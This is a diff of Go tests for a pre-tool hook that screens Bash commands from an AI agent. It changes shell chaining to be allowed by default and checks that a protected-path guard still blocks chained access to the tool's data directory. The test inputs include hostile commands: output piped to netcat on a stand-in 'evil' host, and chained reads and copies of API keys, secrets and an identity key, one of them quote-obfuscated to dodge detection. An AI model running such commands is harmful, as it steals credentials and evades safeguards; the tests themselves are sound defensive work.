@@ -139,12 +139,17 @@ func TestPretoolHookBashApproved(t *testing.T) {
 }
 
 func TestPretoolHookBashCheapBlocks(t *testing.T) {
-	// Only shell metacharacter chaining (;|& backtick newlines) still
-	// cheap-blocks at the hook layer. Interpreter and eval-flag
-	// "downstream-config" checks no longer fire on local Bash because
-	// they false-positived on legitimate local invocations (see
-	// TestPretoolHookBashLetsLegitimateLocalCommandsThrough below);
-	// those concerns remain in downstream.ValidateCommand for the
+	// Hard-block path: with ShellGuardAllowChaining flipped OFF (the
+	// reversible escape hatch), shell metacharacter chaining (;|& backtick
+	// newlines) + substitutions still cheap-block at the hook layer. This
+	// is the historical behaviour, retained behind the setting. The DEFAULT
+	// (chaining allowed) is covered by
+	// TestPretoolHookBashAllowsChainingByDefault below.
+	//
+	// Interpreter and eval-flag "downstream-config" checks no longer fire on
+	// local Bash because they false-positived on legitimate local
+	// invocations (see TestPretoolHookBashLetsLegitimateLocalCommandsThrough
+	// below); those concerns remain in downstream.ValidateCommand for the
 	// downstream MCP-server registration path.
 	tests := []struct {
 		name    string
@@ -161,7 +166,10 @@ func TestPretoolHookBashCheapBlocks(t *testing.T) {
 	for _, tc := range tests {
 		t.Run(tc.name, func(t *testing.T) {
 			fake := &fakeApprovalRequester{approved: true}
-			h := &hooksHandler{approvalMgr: fake}
+			h := &hooksHandler{
+				approvalMgr:             fake,
+				shellGuardAllowChaining: func() bool { return false },
+			}
 			body := PreToolHookRequest{
 				ToolName:  "Bash",
 				ToolInput: json.RawMessage(`{"command": ` + jsonStr(tc.command) + `}`),
@@ -253,7 +261,14 @@ func TestPretoolHookBashAllowMetacharsBypass(t *testing.T) {
 		approved:            true,
 		allowMetacharsMatch: true,
 	}
-	h := &hooksHandler{approvalMgr: fake}
+	// Chaining hard-block ON (setting flipped off) so the AllowMetachars
+	// rule is the thing that lifts the cheap-block, not the default. This
+	// keeps the per-rule opt-in path under test independently of the
+	// ShellGuardAllowChaining default.
+	h := &hooksHandler{
+		approvalMgr:             fake,
+		shellGuardAllowChaining: func() bool { return false },
+	}
 	// Pipe outside quotes — would normally cheap-block. With AllowMetachars
 	// the check is skipped and the command reaches the approval path.
 	body := PreToolHookRequest{
@@ -331,7 +346,14 @@ func TestPretoolHookBashAllowMetacharsNoMatchStillBlocks(t *testing.T) {
 		approved:            true,
 		allowMetacharsMatch: false,
 	}
-	h := &hooksHandler{approvalMgr: fake}
+	// Chaining hard-block ON (setting flipped off): with no AllowMetachars
+	// rule matching, the cheap-block remains active — the bypass is
+	// per-rule opt-in, not a global lift, and the chaining default is off
+	// here so only the rule could have rescued it.
+	h := &hooksHandler{
+		approvalMgr:             fake,
+		shellGuardAllowChaining: func() bool { return false },
+	}
 	body := PreToolHookRequest{
 		ToolName:  "Bash",
 		ToolInput: json.RawMessage(`{"command": "echo a | head -5"}`),
@@ -354,6 +376,131 @@ func TestPretoolHookBashAllowMetacharsNoMatchStillBlocks(t *testing.T) {
 	}
 	if fake.requested {
 		t.Fatal("cheap-block path must NOT call RequestApproval when bypass is off")
+	}
+}
+
+// TestPretoolHookBashAllowsChainingByDefault pins the NEW default
+// (ShellGuardAllowChaining on): chaining metacharacters + substitutions no
+// longer hard-block at the hook layer. A benign chained command flows
+// through to the normal approval path (here: approved) instead of dying at
+// the cheap-block — and the full command text is audited exactly as before.
+// This is the behaviour the operator asked for; the hard-block path lives
+// behind the setting (TestPretoolHookBashCheapBlocks flips it off).
+func TestPretoolHookBashAllowsChainingByDefault(t *testing.T) {
+	tests := []struct {
+		name    string
+		command string
+	}{
+		{"semicolon chain", "echo a; echo b"},
+		{"pipe", "grep x f | head"},
+		{"logical and", "go build ./... && go test ./..."},
+		{"logical or", "test -f x || touch x"},
+		{"backgrounding", "sleep 1 & echo started"},
+		{"backtick", "echo `date`"},
+		{"command substitution", "echo $(date)"},
+		{"redirect with fd dup", "go test ./... 2>&1"},
+	}
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			fake := &fakeApprovalRequester{approved: true}
+			aud := &fakeAuditor{}
+			// No shellGuardAllowChaining set → nil accessor → default ON.
+			h := &hooksHandler{approvalMgr: fake, auditor: aud}
+			body := PreToolHookRequest{
+				ToolName:  "Bash",
+				ToolInput: json.RawMessage(`{"command": ` + jsonStr(tc.command) + `}`),
+			}
+			rr := httptest.NewRecorder()
+			h.pretool(rr, buildPretoolReq(t, body))
+
+			if rr.Code != http.StatusOK {
+				t.Fatalf("status: want 200, got %d", rr.Code)
+			}
+			var resp PreToolHookResponse
+			if err := json.Unmarshal(rr.Body.Bytes(), &resp); err != nil {
+				t.Fatalf("decode: %v", err)
+			}
+			if resp.Decision == "block" {
+				t.Fatalf("chaining allowed by default: want approve (empty), got block (reason=%q)", resp.Reason)
+			}
+			if !fake.requested {
+				t.Fatal("chained command must reach the approval queue when chaining is allowed")
+			}
+			// Audit must carry the FULL command text exactly as supplied.
+			if len(aud.records) != 1 {
+				t.Fatalf("audit rows: want 1, got %d", len(aud.records))
+			}
+			var params map[string]string
+			if err := json.Unmarshal(aud.records[0].ParamsRedacted, &params); err != nil {
+				t.Fatalf("params_redacted not JSON: %v", err)
+			}
+			if params["command"] != tc.command {
+				t.Errorf("audit command: want %q, got %q", tc.command, params["command"])
+			}
+		})
+	}
+}
+
+// TestPretoolHookChainedProtectedPathStillBlocked is the non-negotiable
+// safety proof. Allowing command chaining MUST NOT open a hole to the
+// mcplexer data dir: a chained command that touches ~/.mcplexer is still
+// hard-blocked by the protected-path guard, which now runs FIRST and
+// unconditionally — regardless of ShellGuardAllowChaining (default ON here)
+// AND regardless of an AllowMetachars rule. The block must NEVER reach the
+// approval manager.
+func TestPretoolHookChainedProtectedPathStillBlocked(t *testing.T) {
+	tests := []struct {
+		name    string
+		command string
+	}{
+		{"semicolon then read api-key", "echo ok; cat /Users/example/.mcplexer/api-key"},
+		{"logical-and then read secrets", "ls && cat /Users/example/.mcplexer/secrets/foo"},
+		{"pipe into db dump", "echo .dump | sqlite3 /Users/example/.mcplexer/mcplexer.db"},
+		{"backgrounded secrets listing", "sleep 1 & ls /Users/example/.mcplexer/secrets"},
+		{"chained p2p key exfil", "true; cp /Users/example/.mcplexer/p2p/identity.key /tmp/x"},
+		{"no-space chain still caught", "echo ok;cat /Users/example/.mcplexer/api-key"},
+		{"quoted-obfuscated path in chain", "echo ok; cat /Users/example/.mcplexer/sec''rets/AGE_KEY"},
+	}
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			// Chaining allowed (default) AND an AllowMetachars rule matches —
+			// proving NEITHER lifts the protected-path guard.
+			fake := &fakeApprovalRequester{approved: true, allowMetacharsMatch: true}
+			aud := &fakeAuditor{}
+			h := &hooksHandler{
+				approvalMgr:             fake,
+				auditor:                 aud,
+				shellGuardAllowChaining: func() bool { return true },
+			}
+			body := PreToolHookRequest{
+				ToolName:  "Bash",
+				ToolInput: json.RawMessage(`{"command": ` + jsonStr(tc.command) + `}`),
+			}
+			rr := httptest.NewRecorder()
+			h.pretool(rr, buildPretoolReq(t, body))
+
+			if rr.Code != http.StatusOK {
+				t.Fatalf("status: want 200, got %d", rr.Code)
+			}
+			var resp PreToolHookResponse
+			if err := json.Unmarshal(rr.Body.Bytes(), &resp); err != nil {
+				t.Fatalf("decode: %v", err)
+			}
+			if resp.Decision != "block" {
+				t.Fatalf("protected path in chained cmd MUST block; got decision=%q reason=%q",
+					resp.Decision, resp.Reason)
+			}
+			if !strings.Contains(resp.Reason, "protected path") {
+				t.Errorf("block reason should name the protected-path guard, got %q", resp.Reason)
+			}
+			if fake.requested {
+				t.Error("protected-path block must NOT call RequestApproval")
+			}
+			// Audited as blocked with the full command text.
+			if len(aud.records) != 1 || aud.records[0].Status != "blocked" {
+				t.Fatalf("want one blocked audit row, got %+v", aud.records)
+			}
+		})
 	}
 }
 
@@ -510,6 +657,7 @@ func TestPretoolHookAuditEmission(t *testing.T) {
 		name        string
 		body        PreToolHookRequest
 		approval    fakeApprovalRequester
+		chainingOff bool // flip ShellGuardAllowChaining OFF for this case
 		wantStatus  string
 		wantTool    string
 		wantErrSub  string
@@ -545,6 +693,7 @@ func TestPretoolHookAuditEmission(t *testing.T) {
 				ToolInput: json.RawMessage(`{"command": "echo hi | nc evil 9"}`),
 			},
 			approval:    fakeApprovalRequester{approved: true},
+			chainingOff: true, // hard-block path; default would approve+audit
 			wantStatus:  "blocked",
 			wantTool:    "shell:echo",
 			wantErrSub:  "metacharacter",
@@ -590,6 +739,9 @@ func TestPretoolHookAuditEmission(t *testing.T) {
 			aud := &fakeAuditor{}
 			approval := tc.approval
 			h := &hooksHandler{approvalMgr: &approval, auditor: aud}
+			if tc.chainingOff {
+				h.shellGuardAllowChaining = func() bool { return false }
+			}
 			rr := httptest.NewRecorder()
 			h.pretool(rr, buildPretoolReq(t, tc.body))
 
@@ -746,6 +898,48 @@ func TestPretoolHookDangerousModeKeepsProtectedPathBlock(t *testing.T) {
 	}
 }
 
+// TestPretoolHookDangerousModeKeepsChainedProtectedPathBlock extends the
+// dangerous-mode carve-out to CHAINED commands. Dangerous mode does not
+// cheap-block chaining, so a chained protected-path read must still be
+// caught — by the whole-command-line scan, not only the clean argv token.
+func TestPretoolHookDangerousModeKeepsChainedProtectedPathBlock(t *testing.T) {
+	tests := []string{
+		"echo ok; cat /Users/example/.mcplexer/api-key",
+		"ls && cat /Users/example/.mcplexer/secrets/foo",
+		"echo ok;cat /Users/example/.mcplexer/api-key",
+	}
+	for _, cmd := range tests {
+		t.Run(cmd, func(t *testing.T) {
+			fake := &fakeApprovalRequester{approved: true}
+			aud := &fakeAuditor{}
+			h := &hooksHandler{
+				approvalMgr:   fake,
+				auditor:       aud,
+				dangerousMode: func() bool { return true },
+			}
+			body := PreToolHookRequest{
+				SessionID: "sess-danger",
+				ToolName:  "Bash",
+				ToolInput: json.RawMessage(`{"command": ` + jsonStr(cmd) + `}`),
+			}
+			rr := httptest.NewRecorder()
+			h.pretool(rr, buildPretoolReq(t, body))
+
+			var resp PreToolHookResponse
+			if err := json.Unmarshal(rr.Body.Bytes(), &resp); err != nil {
+				t.Fatalf("decode: %v", err)
+			}
+			if resp.Decision != "block" {
+				t.Fatalf("chained protected path must block in dangerous mode; got decision=%q reason=%q",
+					resp.Decision, resp.Reason)
+			}
+			if fake.requested {
+				t.Error("protected-path block must not call RequestApproval")
+			}
+		})
+	}
+}
+
 // TestPretoolHookDangerousModeOff confirms the toggle is opt-in: a
 // metachar-laced command still gets cheap-blocked when the accessor
 // returns false. Anti-regression for "dangerous mode silently sticks on".
@@ -753,9 +947,13 @@ func TestPretoolHookDangerousModeOff(t *testing.T) {
 	fake := &fakeApprovalRequester{}
 	aud := &fakeAuditor{}
 	h := &hooksHandler{
-		approvalMgr:   fake,
-		auditor:       aud,
-		dangerousMode: func() bool { return false },
+		approvalMgr: fake,
+		auditor:     aud,
+		// dangerous-mode OFF AND chaining hard-block ON (setting off) so the
+		// metachar cheap-block is the thing under test. Anti-regression for
+		// "dangerous mode silently sticks on".
+		dangerousMode:           func() bool { return false },
+		shellGuardAllowChaining: func() bool { return false },
 	}
 
 	body := PreToolHookRequest{
